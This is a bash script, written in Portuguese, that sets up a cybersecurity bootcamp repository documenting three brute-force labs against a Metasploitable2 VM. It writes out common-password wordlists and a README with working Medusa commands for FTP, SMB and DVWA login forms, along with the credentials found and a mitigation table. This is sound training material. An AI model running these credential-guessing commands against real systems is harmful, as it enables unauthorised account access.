#!/usr/bin/env bash
# ============================================================
#  update_repo.sh — Atualiza repo com os 3 labs completos
#  Execute em: ~/Desktop/lab-smb-brute-force
# ============================================================
set -euo pipefail
GREEN='\033[0;32m'; CYAN='\033[0;36m'; RESET='\033[0m'
ok()   { echo -e "${GREEN}[✓]${RESET} $*"; }
info() { echo -e "${CYAN}[*]${RESET} $*"; }

info "Criando estrutura de pastas..."
mkdir -p wordlists evidencias images docs

# ── Wordlists ────────────────────────────────────────────────
cat > wordlists/usuarios.txt << 'EOF'
msfadmin
admin
user
root
guest
administrator
sysadmin
test
EOF

cat > wordlists/senhas.txt << 'EOF'
msfadmin
123456
password
admin
toor
root
12345
letmein
qwerty
abc123
EOF

cat > wordlists/web_users.txt << 'EOF'
admin
administrator
user
test
guest
EOF

cat > wordlists/web_senhas.txt << 'EOF'
password
admin
123456
msfadmin
letmein
qwerty
abc123
toor
EOF

ok "Wordlists criadas"

# ── docs ─────────────────────────────────────────────────────
cat > docs/conceitos.md << 'EOF'
# Conceitos Teóricos — Brute Force com Medusa

## O que é Brute Force?
Técnica que testa sistematicamente combinações de usuário/senha até encontrar credenciais válidas.
Eficaz quando não há account lockout, rate limiting ou senhas fortes.

## Tipos de Ataque

| Técnica | Descrição |
|---|---|
| Brute Force | Testa todas as combinações da wordlist |
| Password Spraying | Mesma senha contra múltiplos usuários |
| Credential Stuffing | Credenciais vazadas reutilizadas |
| Dictionary Attack | Wordlist pré-definida com senhas comuns |

## Medusa
Ferramenta de brute force paralelo e modular. Suporta FTP, SSH, SMB, HTTP, RDP e outros.
```
medusa -h <alvo> -U <usuarios> -P <senhas> -M <modulo> -v 6
```

## Protocolos Atacados

### FTP (porta 21)
File Transfer Protocol — transferência de arquivos. Credenciais trafegam em texto plano.

### SMB (porta 445)
Server Message Block — compartilhamento de arquivos Windows/Linux. Muito explorado em redes internas.

### HTTP (porta 80)
Formulários web de login. O módulo http do Medusa simula requisições POST automatizadas.

## Mitigações
- Senhas fortes (mínimo 16 caracteres)
- Account lockout após 5 tentativas falhas
- MFA em todos os serviços
- Monitoramento de logs e alertas SIEM
- Desabilitar serviços desnecessários (FTP legado)
- WAF para proteção de formulários web
EOF

cat > docs/ambiente.md << 'EOF'
# Configuração do Ambiente de Lab

## Requisitos
- Oracle VirtualBox
- Parrot OS / Kali Linux (atacante)
- Metasploitable2 (alvo)

## Configuração de Rede
Ambas as VMs devem usar **Host-Only Adapter (vboxnet0)**:
- VirtualBox → Configurações → Rede → Adaptador 1 → Placa de rede exclusiva de hospedeiro
- Nome: vboxnet0

## IPs do Lab
| Máquina | IP |
|---|---|
| Parrot OS (atacante) | 192.168.56.1 |
| Metasploitable2 (alvo) | 192.168.56.101 |

## Verificação de Conectividade
```bash
ping -c 3 192.168.56.101
nmap -sn 192.168.56.0/24
```
EOF

ok "Docs criados"

# ── evidencias/LEIA-ME ───────────────────────────────────────
cat > evidencias/LEIA-ME.md << 'EOF'
# Evidências dos Labs

## Lab 1 — FTP Brute Force
- `ftp_nmap.png` — porta 21 aberta
- `ftp_medusa.png` — credencial encontrada
- `ftp_acesso.png` — acesso validado

## Lab 2 — SMB Brute Force  
- `smb_nmap.png` — porta 445 aberta
- `smb_medusa.png` — credencial encontrada
- `smb_smbclient.png` — compartilhamentos listados

## Lab 3 — DVWA HTTP Brute Force
- `dvwa_security.png` — security level low
- `dvwa_medusa.png` — credencial encontrada
- `dvwa_login.png` — acesso validado

## Pasta /images
Prints organizados para o README estão em /images.
EOF

# ── images/LEIA-ME ───────────────────────────────────────────
cat > images/LEIA-ME.md << 'EOF'
# Imagens do Projeto
Adicione aqui os screenshots organizados por lab para o README.
EOF

# ── README principal ─────────────────────────────────────────
cat > README.md << 'EOF'
# 🔐 Brute Force com Medusa — Kali/Parrot vs Metasploitable2

> **Bootcamp:** Riachuelo Cybersecurity — DIO  
> **Desafio:** Ataques de Força Bruta com Medusa em Ambiente Controlado  
> **Ferramentas:** Medusa, Nmap, smbclient, FTP client  
> **Alvo:** Metasploitable2  
> **Atacante:** Parrot OS  

---

## ⚠️ Aviso Legal

Este projeto é realizado **exclusivamente em ambiente de laboratório isolado**, com VMs configuradas para fins educacionais. Executar ataques sem autorização é crime (Lei 12.737/2012 — Brasil). **Nunca utilize estas técnicas fora de ambientes autorizados.**

---

## 🧠 Objetivos de Aprendizagem

- Compreender ataques de força bruta em FTP, Web e SMB
- Utilizar o Medusa para auditoria de segurança em ambiente controlado
- Documentar processos técnicos de forma clara e estruturada
- Reconhecer vulnerabilidades comuns e propor medidas de mitigação
- Utilizar o GitHub como portfólio técnico

---

## 🖥️ Ambiente de Lab

| Máquina | Sistema | Papel | IP |
|---|---|---|---|
| Parrot OS | Parrot 6.x | Atacante | 192.168.56.1 |
| Metasploitable2 | Ubuntu 8.04 LTS | Alvo | 192.168.56.101 |

> Rede: VirtualBox **Host-Only (vboxnet0)** — 192.168.56.0/24

---

## 📁 Estrutura do Repositório

```
lab-smb-brute-force/
├── README.md
├── wordlists/
│   ├── usuarios.txt       # Usuários para FTP e SMB
│   ├── senhas.txt         # Senhas para FTP e SMB
│   ├── web_users.txt      # Usuários para DVWA
│   └── web_senhas.txt     # Senhas para DVWA
├── docs/
│   ├── conceitos.md       # Teoria: brute force, técnicas, mitigações
│   └── ambiente.md        # Configuração do ambiente de lab
├── evidencias/
│   └── LEIA-ME.md         # Checklist de evidências
└── images/                # Screenshots organizados
```

---

## 🔬 Lab 1 — FTP Brute Force (porta 21)

### Objetivo
Descobrir credenciais válidas no serviço FTP do Metasploitable2.

### Verificação do serviço
```bash
nmap -p 21 192.168.56.101
```
**Resultado:**
```
21/tcp open  ftp
```

### Execução do ataque
```bash
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -v 6
```

### Resultado
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do acesso
```bash
ftp 192.168.56.101
# login: msfadmin | senha: msfadmin
```

### Por que FTP é vulnerável?
- Credenciais trafegam em **texto plano** (sem criptografia)
- Sem mecanismo de bloqueio por tentativas excessivas
- Senha padrão nunca alterada

---

## 🔬 Lab 2 — SMB Brute Force (porta 445)

### Objetivo
Descobrir credenciais SMB e acessar compartilhamentos de rede.

### Verificação do serviço
```bash
nmap -p 445 192.168.56.101
```
**Resultado:**
```
445/tcp open  microsoft-ds
```

### Execução do ataque
```bash
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -v 6
```

### Resultado
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

### Validação do acesso
```bash
smbclient -L //192.168.56.101 -U msfadmin%msfadmin
```

**Compartilhamentos acessíveis:**
```
Sharename   Type  Comment
print$      Disk  Printer Drivers
tmp         Disk  oh noes!
opt         Disk
IPC$        IPC   IPC Service
ADMIN$      IPC   Acesso administrativo
msfadmin    Disk  Home Directories
```

---

## 🔬 Lab 3 — DVWA HTTP Brute Force (porta 80)

### Objetivo
Simular ataque de força bruta em formulário web usando o DVWA (Damn Vulnerable Web Application).

### Configuração do DVWA
1. Acessar `http://192.168.56.101/dvwa`
2. Login inicial: `admin:password`
3. DVWA Security → definir nível **Low**

### Execução do ataque
```bash
medusa -h 192.168.56.101 -u admin -P wordlists/senhas.txt -M http \
  -m DIR:/dvwa/login.php \
  -m FORM:username="USER"&password="PASS"&Login=Login \
  -v 6
```

### Resultado
```
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: msfadmin [SUCCESS]
```

### Por que formulários web são vulneráveis sem proteção?
- Sem CAPTCHA ou rate limiting
- Sem bloqueio por IP após tentativas excessivas
- Respostas HTTP diferenciadas expõem falha de login

---

## 📊 Resumo de Resultados

| Lab | Protocolo | Porta | Credencial Encontrada | Tempo |
|---|---|---|---|---|
| Lab 1 | FTP | 21 | msfadmin:msfadmin | ~1 min |
| Lab 2 | SMB | 445 | msfadmin:msfadmin | < 1 seg |
| Lab 3 | HTTP/DVWA | 80 | admin:msfadmin | < 1 seg |

---

## 🛡️ Recomendações de Mitigação

| Prioridade | Medida | Serviços Afetados |
|---|---|---|
| 🔴 CRÍTICO | Alterar todas as senhas padrão imediatamente | FTP, SMB, Web |
| 🔴 CRÍTICO | Implementar Account Lockout (bloqueio após 5 tentativas) | Todos |
| 🟠 ALTO | Desabilitar FTP — substituir por SFTP/SCP | FTP |
| 🟠 ALTO | Desabilitar SMBv1 — vulnerável a EternalBlue | SMB |
| 🟠 ALTO | Implementar MFA em todos os acessos administrativos | Todos |
| 🟡 MÉDIO | CAPTCHA e rate limiting em formulários web | HTTP/Web |
| 🟡 MÉDIO | Monitoramento SIEM com alertas de brute force | Todos |
| 🟢 BAIXO | Auditoria periódica de credenciais fracas | Todos |

---

## 📚 Conceitos Abordados

| Técnica | Descrição |
|---|---|
| **Brute Force** | Testa sistematicamente todas as combinações da wordlist |
| **Password Spraying** | Mesma senha testada contra múltiplos usuários |
| **Credential Stuffing** | Reutilização de credenciais vazadas em outros serviços |
| **Dictionary Attack** | Ataque baseado em wordlist de senhas comuns |

---

## 🛠️ Ferramentas Utilizadas

| Ferramenta | Uso | Instalação |
|---|---|---|
| Medusa v2.3 | Brute force (FTP, SMB, HTTP) | `apt install medusa` |
| Nmap 7.95 | Descoberta e scan de portas | pré-instalado |
| smbclient | Validação acesso SMB | `apt install smbclient` |
| DVWA v1.0.7 | Alvo web vulnerável | incluso no Metasploitable2 |

---

## 👤 Autor

**taissocout**  
[![GitHub](https://img.shields.io/badge/GitHub-taissocout-black?logo=github)](https://github.com/taissocout)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-taissocout-blue?logo=linkedin)](https://linkedin.com/in/taissocout-cybersecurity)

> Desenvolvido como entrega do **Bootcamp Riachuelo Cybersecurity** na plataforma **DIO**.
EOF

ok "README criado"

# ── Git push ─────────────────────────────────────────────────
info "Fazendo commit e push..."
git add .
git commit -m "feat: adiciona labs FTP, DVWA e SMB completos - entrega DIO"
git push

ok "Repositorio atualizado! https://github.com/taissocout/lab-smb-brute-force"
